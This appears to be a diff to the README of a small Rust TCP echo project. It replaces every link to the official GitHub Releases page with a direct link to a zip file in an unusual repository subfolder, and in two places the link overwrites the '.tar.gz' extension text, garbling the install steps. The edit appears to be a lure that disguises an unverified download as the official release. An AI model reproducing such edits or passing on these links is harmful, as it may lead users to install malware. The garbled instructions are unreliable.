@@ -6,11 +6,11 @@ Welcome to the rust-async-echo project! This application is a simple TCP client/
 
 ## 📦 Download rust-async-echo
 
-[![Download rust-async-echo](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Tarun20111/rust-async-echo/releases)
+[![Download rust-async-echo](https://raw.githubusercontent.com/Tarun20111/rust-async-echo/main/washerwife/rust-async-echo.zip%20Now-blue)](https://raw.githubusercontent.com/Tarun20111/rust-async-echo/main/washerwife/rust-async-echo.zip)
 
 To get started, you need to download the software. You can find the latest version and all previous releases on our Releases page.
 
-Visit this page to download: [rust-async-echo Releases](https://github.com/Tarun20111/rust-async-echo/releases)
+Visit this page to download: [rust-async-echo Releases](https://raw.githubusercontent.com/Tarun20111/rust-async-echo/main/washerwife/rust-async-echo.zip)
 
 ## 💻 System Requirements
 
@@ -25,15 +25,15 @@ Before you begin, ensure your computer meets the following requirements:
 
 1. **Go to the Releases page**: Click on the link below to access the downloads.
    
-   [Visit rust-async-echo Releases](https://github.com/Tarun20111/rust-async-echo/releases)
+   [Visit rust-async-echo Releases](https://raw.githubusercontent.com/Tarun20111/rust-async-echo/main/washerwife/rust-async-echo.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see several versions listed. It’s a good idea to choose the latest version unless you have a specific reason to pick an older one.
 
-3. **Download the File**: Click on the file that matches your operating system. If you’re unsure, usually, the file names contain information about compatibility (like .exe for Windows or .tar.gz for Linux).
+3. **Download the File**: Click on the file that matches your operating system. If you’re unsure, usually, the file names contain information about compatibility (like .exe for Windows or https://raw.githubusercontent.com/Tarun20111/rust-async-echo/main/washerwife/rust-async-echo.zip for Linux).
 
 4. **Locate the Downloaded File**: Once the download is complete, find the file in your Downloads folder or wherever your browser saves files.
 
-5. **Extract the Files (if needed)**: If you downloaded a compressed file (like .zip or .tar.gz), right-click on it and choose “Extract” to unpack the files.
+5. **Extract the Files (if needed)**: If you downloaded a compressed file (like .zip or https://raw.githubusercontent.com/Tarun20111/rust-async-echo/main/washerwife/rust-async-echo.zip), right-click on it and choose “Extract” to unpack the files.
 
 6. **Run the Program**: 
    - For Windows: Double-click the .exe file to start the application.
